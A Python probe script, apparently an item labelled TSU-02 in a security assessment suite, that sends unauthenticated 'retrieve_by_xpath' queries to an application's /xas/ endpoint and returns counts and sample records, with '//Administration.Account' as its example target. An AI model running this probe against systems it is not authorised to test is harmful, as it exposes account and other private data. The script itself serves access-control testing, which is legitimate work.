#!/usr/bin/env python3
"""
Attempt to retrieve entity data via unauthenticated XPath query on /xas/.
TSU-02

Usage: python fetch_entity_data.py <url> <xpath>
  xpath example: //Administration.Account
Output: JSON to stdout
"""
import json
import sys
import requests


def fetch_entity_data(url: str, xpath: str) -> dict:
    xas = url.rstrip("/") + "/xas/"
    payload = {
        "action": "retrieve_by_xpath",
        "params": {
            "xpath": xpath,
            "schema": {"amount": 5, "offset": 0},
            "count": True,
            "aggregates": False,
        },
    }
    try:
        resp = requests.post(xas, json=payload, timeout=5)
    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
        return {"xpath": xpath, "accessible": None, "count": None, "sample": None, "error": str(e)}

    result = {
        "xpath": xpath,
        "status_code": resp.status_code,
        "accessible": resp.ok,
        "count": None,
        "sample": None,
        "error": None,
    }

    if resp.ok:
        try:
            data = resp.json()
            result["count"] = data.get("count")
            objects = data.get("objects") or []
            result["sample"] = objects[:3]
        except ValueError as e:
            result["error"] = f"invalid JSON: {e}"

    return result


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(json.dumps({"error": "usage: fetch_entity_data.py <url> <xpath>"}))
        sys.exit(1)
    print(json.dumps(fetch_entity_data(sys.argv[1], sys.argv[2]), indent=2))
